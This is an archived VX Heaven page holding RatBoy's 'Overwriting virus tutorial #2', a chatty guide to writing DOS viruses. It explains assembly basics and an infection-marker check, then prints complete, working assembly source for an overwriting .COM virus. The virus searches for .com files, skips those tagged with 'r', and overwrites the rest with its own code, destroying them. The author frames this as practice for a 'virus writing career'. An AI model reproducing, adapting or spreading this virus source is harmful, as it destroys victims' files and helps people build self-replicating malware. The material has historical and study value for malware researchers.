@@ -1,0 +1,377 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> RatBoy 'Overwriting virus tutorial #2' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="RatBoy"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, RatBoy,Overwriting virus tutorial #2, file, blah, write, return, address, viruses, jump, place, part, victum, start, open, live, buffer, read"/>
+<meta name="Description" content="Also, we will move on to more complex overwriting .Com viruses."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"de62952feff8c2a84742827fafa8b00c6062075c-1498758184-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrb02.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div><div style="float:right;"><a href="/lib/index.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: left;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="32" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><br clear="both"/></div>
+<div class="s2"><h1>Overwriting virus tutorial #2</h1><p><a href="/lib/?lang=en&amp;author=RatBoy"> RatBoy</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrb02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrb02">Back to index</a>] [<a href="/lib/vrb02.html#disqus_thread">Comments</a>]<br/> 
+<pre>
+	/\---/\ 
+	( . . )
+	\     / WARNING: Information Contained Within Can Eat Both Your
+	 \   / ^^^^^^^ Mind, Hard Drive and your dog.
+	  \*/ I assume no responsiblity!!!!!!
+	   #
+</pre>
+<p>Hello everyone!!!! Considering I have gotten positive responses about Ratboy#1 I decided to continue on with your lessions in simple viruses. So what is in store for this issue? We will be going over some terms to help us in this issue. Also, we will move on to more complex overwriting .Com viruses. If you read and understood <a href="/lib/vrb01.html">Ratboy#1</a>, you should understand how to due simple file operations. Such as, you need to open the victum for reading and writing, and if you are a ATF agent you need to open the file to shoot it in the back like it was one of your own agents. You will read how to read from your file, write to it, "tag" it, and more helpful example code to help with your further learning of viruses. :) Yea!!</p>
+<p>Now the boreing parts:</p>
+<h2>What is a JMP (jump)?</h2>
+<p>A jump is kinda like what it sounds like, a jump. Since we know that an assembly source reads top to bottom, sometimes we need to skip around in a program depending on the situation. Here's a simple example:</p>
+<pre class="source">
+                call    delta_offset
+        delta_offset:
+                pop     bp
+                sub     bp,delta_offset
+                jmp     restore  ;&lt;===this is a jump :)
+        eat_hd:
+                "blah"
+                "blah"
+</pre>
+<p>As you can see, in the example, we jumped over eat_hd and anything else that was between the jump and restore. A real simple explanation of how a jump works is like this. A jump when put together by the assembler, well be converted to a jump without the label but a displacement. Like this:</p>
+<pre class="source">
+	jmp anywhere
+</pre>
+<p>Really means jmp 45 bytes</p>
+<p>As you can see the number is postive so it a foward jump (negative would be backwards). Now I think I'm getting too far, I just wanted you to understand it's a displacement. I'm not even going into conditional jumps since I did say in the Ratboy#1 you do need to understand Assembly. I know a lot of this should be old hat, but bare with me for now. :)</p>
+<h2>I was recently asked what is a CALL?</h2>
+<p>A call is like a jump with a return address. When a Call is made, the next line offset(address) is pushed into the stack, and a jump to the place called is made. Once there, you can return by using RET. This RET will pop the return address off the stack and jump there.</p>
+<p>Simple example:</p>
+<pre class="source">
+                mov     al,02h
+                call    mov_ptr  ;&lt;==the next line's address it put into
+                                 ;the stack (that would be eat_hd) and a
+                                 ;jump is made to mov_ptr
+        eat_hd:
+                "blah"
+                "blah"
+                "blah"
+                jmp     exit     ;&lt;==simple review, how does this work?
+
+        mov-ptr:
+                "blah"
+                "blah"
+                "blah"
+                ret              ;ah..now the return address(eat_hd) is
+                                 ;popped off the stack and a jump is made
+                                 ;to it
+</pre>
+<h2>Another question was what is an OFFSET?</h2>
+<p>Since we are so far just dealing with .Com files make this real simple. An offset is like an address. If you know where you live, then you understand how and address works. Simple Simple Example:</p>
+<pre>
+        Where does Debby live?
+        Oh, on 16th St. and 5th Ave.  (that is an example of an Offset)
+        Review:
+        Where does Debby live?
+        Oh, go down three blocks and the third house on the left.
+        (this is an example of a jump, see the displacement?)
+</pre>
+<h2>Another question is what is LEA?</h2>
+<p>LEA stands for Load Effective Address. Yarn! Too technical. Here's how it works. Remember in Ratboy#1 when looking for a file, you needed to load the file type(*.com) offset into dx, like this:</p>
+<pre class="source">
+	mov dx,offset file_type
+</pre>
+<p>well you can do this instead:</p>
+<pre class="source">
+	lea dx,file_type
+</pre>
+<p>Nuff said. Practice with it, see its ranges of use.</p>
+<p>Ok I know some one must have fallen asleep, if this bores you just go ahead and read Dark Angel's Virus Writing Guides, maybe they are up to speed with you.</p>
+<h2>How can I speed up my programs?</h2>
+<p>Simple, kinda think of speed as being the least amount of bytes nessary for you to carry out the job. example:</p>
+<pre class="source">
+	mov	ax,0	;3 bytes
+	sub	ax,ax	;2 bytes
+</pre>
+<p>So which one would you figure to be the faster. I used sub ax,ax since I don't want to even go into explaining XOR, but XOR AX,AX will do the samethin. Do some reading up on it, you'll need it for encryption later on in your virus writing carreer. The Sub should make sense, subtract a number from itself = 0.</p>
+<p>Also here's another way of putting what is AX in BX.</p>
+<p>Instead of saying:</p>
+<pre class="source">
+	mov	bx,ax	;2 bytes
+</pre>
+<p>say:</p>
+<pre class="source">
+	xchg	bx,ax	;1 byte
+</pre>
+<p>Ya get it?</p>
+<p>Now down to the exciting part of doing something. Yea!!!!</p>
+<p>Ok in the last issue if you made your virus and you noticed that it infected the first file and not any others, that's because it was real simple. This time we will teach your little life form how to determine if the file is already infected. Now how do you make sure you know which underwear are your's at summer camp, your mom sewed your name inside of them. If you are over 30 and your mom still does this, you are a geek. No arguements, you are a Geek.</p>
+<p>Ok, we need to put in, the infected file, some type of marker, so that we can later read it. Let's keep this simple, since ofcourse that's the motive of this tutorial. I will use the letter "r" for RaTBoY. We will put that "infection marker" right after the jump. So it will kinda look like this:</p>
+<pre class="source">
+        virus_start:
+                jmp     find_first
+        me      db      'r'
+        find_first:
+                "blah"
+                "blah"
+
+</pre>
+<p>Ya see it? Now we will go on. Since to do it all you have to do is put the Me db 'r' in the front of your virus. Now we need to put that jump in there, for the file to go over the 'r' and start looking for the file. All the virus needs to do is read the first four bytes of a file, and check if the 4th (jmp + offset = 3bytes) byte to identify if it's already infected.</p>
+<p>Now let's look at the order of operations. For you english majors this is outline. :)</p>
+<ol type="I">
+<li>find file
+<ol type="a">
+<li>no files to infect...EXIT</li>
+</ol></li>
+<li>open file for reading</li>
+<li>read first four bytes</li>
+<li>close file</li>
+<li>compare to id byte(infection marker)
+<ol type="a">
+<li>if infected already:
+<ol>
+<li>setup to find next file</li>
+<li>goto step I</li>
+</ol></li>
+<li>if not infected continue on</li>
+</ol></li>
+<li>open file for read/write</li>
+<li>write self to file</li>
+<li>close file</li>
+<li>exit</li>
+</ol>
+<p>Now that should not be such a differcult virus to make. Some of this material will be review for you and a chance to see if you can still understand everything clearly.</p>
+<h2>Step I</h2>
+<p>Now of course we need to find the first file. Here are the required inputs:</p>
+<pre>
+	ah = 4eh
+	cx = atributes
+	dx = file type (ie. *.com)
+	int 21h
+</pre>
+<p>if the carry flag is set then there were no files, so if: jc exit ;jump to exit if no files not bad if you can remember this off the top of your head. I think I went over this well enough in Ratboy#1, so not to bore you I go on.</p>
+<h2>Step II</h2>
+<p>Now we need to open that file to read and write to it. Inputs are:</p>
+<pre>
+	ax = 3d00h	;remember the value of AL will setup
+			;for the access you want
+			;al = 00h(read only)
+			;al = 01h(write only)
+			;al = 02h(read/write)
+	dx = offset address of file name
+	int 21h
+Returns:
+	ax = file handle (or error code..nah can't happen)
+</pre>
+<p>Now do you remember where we get that file name? Why of course you know this, it's in the DTA. Now since we didn't mess with it, it should be at 80h in the Program Segment Prefix (PSP). So if you know that and you've read Ratboy#1 where do we look for the address of the file name? That's right 9eh. Remember to put the file handle in BX where we will use it later(ie. xchg bx,ax) Since we went over this in Ratboy#1 we'll go on.</p>
+<h2>Step III</h2>
+<p>Now comes something new. We will read the first four bytes of the victum file, and put it in our buffer, HOLDN_PLACE. Here's the function's inputs:</p>
+<pre>
+	ah = 3fh
+	bx = file handle
+	cx = bytes to read
+	dx = offset of buffer(buffer = the place you put the read byte(s))
+	int 21h
+</pre>
+<p>Here's how it would look in your virus:</p>
+<p>***Remember that at the end of step two we put the file handle in bx***</p>
+<pre class="source">
+	mov	ah,3fh
+	mov	cx,4
+	lea	dx,holdn_place
+	int	21h
+</pre>
+<p>and ofcourse at the end to the virus:</p>
+<pre class="source">
+holdn_place	db	?,?,?,?
+</pre>
+<h2>Step IV</h2>
+<p>Close up the file. So if it's infected, we just move on. If the file is not infected, we open it up for read and write access. Inputs:</p>
+<pre>
+	ax = 3eh
+	int 21h
+</pre>
+<p>Simple enough?</p>
+<h2>Step V</h2>
+<p>Now we will compare the four bytes of the possible victum to the id byte.</p>
+<pre class="source">
+        cmp     byte ptr [holdn_place +3],'r'    ;told ya I would use a 'r'
+        jnz     open_it_again            ;if not same then time to infect
+        mov     ah,4fh                   ;now we set up ah with 4fh(find next)
+                       ;we could use a whole new find file routine but we will
+                       ;use the the one from find first, just that now ah=4fh
+                       ;if that confused you read the source for the setup.
+</pre>
+<h2>Step VI</h2>
+<p>Now since it passed the test of not being infected, just reopen it. This time so we can write to it. :) Then inputs:</p>
+<pre>
+	ax = 3d02h
+	dx = offset of file name
+	int 21h
+</pre>
+<p>Just to go over it one more time here's what it will look like:</p>
+<pre>
+	mov	ax,3d02h
+	mov	dx,9eh		;That's where the file name is in the DTA
+	int	21h
+	xchg	bx,ax		;remember to put that file handle in BX :)
+</pre>
+<h2>Step VII</h2>
+<p>Of course this write to victum part should be real old hat for ya, since this is the part that seperates a lame trojan from a |( 00\_ virus. write to file inputs:</p>
+<pre>
+	ah = 40h(hey isn't that a magazine?)
+	cx = number of bytes to write(size of virus)
+	bx = file handle(victum)
+	dx = offset address of buffer(beginning of virus)
+</pre>
+<p>If unfamiliar with writing to file, just wait and look over the source at the end of this file.</p>
+<h2>Step VIII</h2>
+<p>Close file....sorry if this is getting repetative, but that is the sign of you learning how to do this real well. Inputs:</p>
+<pre>
+	ah = 3eh
+	bx = file handle(victum)
+</pre>
+<h2>Step IX</h2>
+<p>Exit. Here's a real easy way:</p>
+<pre class="source">
+	INT 20h
+</pre>
+<p>Well that is enough of that piece by piece construction. Let's look at the finish part.</p>
+<pre class="source">
+;Ratboy tutorial over writer #2 virus
+
+code    segment                 ;these part should look familar
+        assume  cs:code,ds:code
+        org     100h
+virus   proc    near
+
+virus_start:
+        jmp     find_first
+        db      'r'             ;there's that id byte
+
+find_first:                     ;load ah with 4eh for finding first
+        mov     ah,4eh          ;file like the file_type
+
+find_file:
+        xor     cx,cx           ;this put a 0 in cx, remember? The 0
+                                ;means look for normal attributes
+        lea     dx,file_type    ;sets up for what type of file we're
+                                ;looking for, *.com
+        int     21h
+        jc      exit            ;no files, time to leave.
+
+open_file:
+        mov     ax,3d00h        ;open file found for reading from.
+        mov     dx,9eh          ;the file name is in the DTA
+        int     21h
+        xchg    bx,ax           ;remember that ax will return with the file
+                                ;handle, and we need that is bx  :)
+read_file:
+        mov     ah,3fh          ;read file
+        mov     cx,4            ;four bytes
+        lea     dx,holdn_place  ;that's where it's going.... ;)
+        int     21h
+
+close_it_up:
+        mov     ah,3eh          ;just like it says
+        int     21h
+
+compare:
+        cmp     byte ptr[holdn_place + 3],'r' ;check if there is a 'r'
+        jnz     open_it_up_again              ;not there ok let's infect
+
+        mov     ah,4fh          ;ok let's setup to look for another file
+        jmp     find_file       ;ah..you see how we will be using find_file
+                                ;but this time ah=4fh not 4eh.  See how it's
+                                ;different, but the same.
+open_it_up_again:
+        mov     ax,3d02h        ;Alright, we have a live one here!!!!
+        mov     dx,9eh          ;let's get that file name again
+        int     21h
+        xchg    bx,ax           ;yup, once again.
+
+infect:
+        mov     ah,40h
+        mov     cx,offset endvx - offset virus_start
+                                ;the end minus the beginning gives the lenth
+                                ;of the virus. #of bytes to write.
+        lea     dx,virus_start  ;the virus's begining so this tells where to
+                                ;to start writing from and bx contains the
+                                ;file handle, where to write to.
+        int     21h
+
+close_victum:
+        mov     ah,3eh          ;now let's close up the victum
+        int     21h
+
+exit:   int     20h             ;time to exit, later!!!
+
+file_type       db      "*.com",0
+holdn_place     db      ?,?,?,?
+endvx           label   near
+virus   endp
+code    ends
+        end     virus_start
+
+</pre>
+<p>I really do hope that this tutoral has been helpful to you. Remember if you find this boring. Then you know enough write effective overwriting viruses, and you should move on to other types of virus.</p>
+<p>Now remember the best teacher in virus writer is yourself practicing. So if you want to try something different, try it. Just don't do it in your DOS directory. :)</p>
+<p>Also Included with this file: sources to overwriters and Ratboy viruses. You still need an Assembler, Bait files, a good reference book and not to forget good people to ask a lot of dumb questions to. Like I do. :)</p>
+<p>Of course that usual ending where I thank all those that have helped me:</p>
+<ul>
+<li>GOD: I woke up breathing today. :)</li>
+<li>Mrs. Ratboy: For putting up with me ;)</li>
+<li>FC: For all the help dude!!!!!!!!!!!!</li>
+<li>Aristotle: No Aristotle I didn't mean you when I said GOD, but Thanks.</li>
+<li>M.P.: Love ya software, Invircible.</li>
+</ul>
+<p>Thanks to these guys and groups: Virogen, Terminal Velocity, NuKE, Falcon, Vlad, Immortal Riot, P/S, ACVR, and every virus writer I didn't mention!!!</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vrb02">Back to index</a>] [<a href="/lib/vrb02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrb02">de</a><a href="/lib/index.php?lang=en&amp;id=vrb02">en</a><a href="/lib/index.php?lang=es&amp;id=vrb02">es</a><a href="/lib/index.php?lang=it&amp;id=vrb02">it</a><a href="/lib/index.php?lang=fr&amp;id=vrb02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrb02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrb02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrb02">ua</a></div>
+</body>
+</html>
